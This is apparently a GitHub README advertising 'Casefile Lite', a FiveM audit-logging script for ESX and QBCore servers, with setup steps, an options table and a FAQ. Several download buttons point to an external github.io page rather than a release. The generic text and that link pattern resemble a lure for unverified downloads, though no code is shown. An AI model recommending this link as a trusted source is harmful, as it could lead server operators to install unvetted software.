# Casefile Lite - Game Script Utility 2026

> **Server integrity and investigation tooling for FiveM.** Casefile Lite records important server events, provides searchable audit views, and supports operational review across ESX and QBCore environments.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/okrause01/casefile-win-80556?style=flat-square)](https://github.com/okrause01/casefile-win-80556)

---

<p align="center">
  <a href="https://okrause01.github.io/casefile-win-80556/">
    <img src="https://img.shields.io/badge/Download-Casefile%20Lite%20Script-brightgreen?style=for-the-badge" alt="Download Casefile Lite Script">
  </a>
</p>

> **[Direct Download - Casefile Lite](https://okrause01.github.io/casefile-win-80556/)**

---

[Download Latest Build](https://okrause01.github.io/casefile-win-80556/)

---

## Overview

Casefile Lite is a FiveM server integrity and investigation suite for reviewing activity across GTA5 roleplay servers. It captures money, item, administrative, and session events, then makes those records available through an in-game searchable panel.

The suite is designed for servers using ESX or QBCore and can retain its records in the server's own database. Operators can narrow investigations by player, event category, or time range, while optional Discord webhook mirroring provides an additional event destination. Casefile Lite can also ingest information from anticheat systems and txAdmin.

---

## Script Features

- Records money-related events for later review
- Captures item activity and administrative actions
- Tracks session events within the server environment
- Provides an in-game panel for searchable event review
- Filters records by player, category, and time range
- Stores collected data in the server's configured database
- Supports optional Discord webhook event mirroring
- Accepts event input from anticheat resources and txAdmin
- Works with both ESX and QBCore frameworks

---

## Setup

1. Download the latest Casefile Lite build from the link above.
2. Extract the resource into your FiveM server's resources directory.
3. Configure the database connection and any available integration settings.
4. Add the resource to `server.cfg`:

```cfg
ensure casefile
```

5. Restart the server or start the resource from the server console.
6. Confirm that the resource loads successfully and that events appear in the investigation panel.

The resource should be configured alongside the framework and event-producing resources used by your server. If Discord mirroring is enabled, provide the webhook details in the resource configuration before starting the server.

---

## Options

Configuration names may vary by build. Use the included resource configuration as the source of truth for available settings.

| Area | Purpose | Default handling |
|---|---|---|
| Event capture | Select the event categories recorded by Casefile Lite | Configure for the server's audit needs |
| Player filter | Narrow investigation results to a specific player | Applied from the in-game panel |
| Category filter | View money, item, admin, or session records separately | Applied from the in-game panel |
| Time range | Restrict results to a selected period | Applied during searches |
| Database storage | Save records to the server database | Uses the configured server database |
| Discord mirroring | Forward selected events to a Discord webhook | Optional |
| External ingestion | Receive events from anticheat resources and txAdmin | Enable and configure supported integrations |

---

## Compatibility

- **Platform:** FiveM
- **Game:** GTA5
- **Frameworks:** ESX and QBCore
- **Integration sources:** Anticheat resources and txAdmin
- **Language environment:** Lua-based FiveM resources
- **Storage:** The server's configured database

Casefile Lite depends on the events exposed by the framework and connected resources. Event coverage may differ between server configurations, custom resources, anticheat systems, and txAdmin setups. Review the included configuration and integration requirements when adapting it to a customized server.

---

## Changelog

### 2026

- Current Lite release documentation
- Event audit coverage for money, items, admin actions, and sessions
- Search and filtering support for in-game investigations
- ESX and QBCore compatibility
- Optional Discord webhook and external event ingestion support

---

## FAQ

### How do I install Casefile Lite?

Download the resource, place it in the server's resources directory, configure its database and integrations, then add `ensure casefile` to `server.cfg`.

### Where are event records stored?

Casefile Lite stores collected records in the server's own configured database.

### Can I limit searches to one player or event type?

Yes. The in-game event panel supports filtering by player, category, and time range.

### Does it work with both ESX and QBCore?

Yes. Casefile Lite supports both frameworks, subject to the event data available in the individual server setup.

### How are updates delivered?

Use the latest build link at the top of this document, then replace the existing resource files according to the release's installation notes. Preserve any local configuration that should remain in use.

### Can I send events to Discord?

Discord webhook mirroring is optional. Configure the webhook integration in the resource settings if your server requires it.

### Can anticheat and txAdmin data be included?

Casefile Lite can ingest events from anticheat resources and txAdmin when the relevant integration is configured and the connected systems expose compatible event data.

### Can the script be customized?

Customization depends on the available resource configuration and the events exposed by your framework and connected resources. Keep local changes documented so they can be reapplied when updating.

### Does the script replace a database or framework?

No. It uses the server's existing database setup and supports ESX or QBCore rather than replacing them.

### Where should local settings be kept?

Keep server-specific database, webhook, framework, and integration settings in the resource configuration supplied with your build. Do not publish private connection details or webhook URLs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
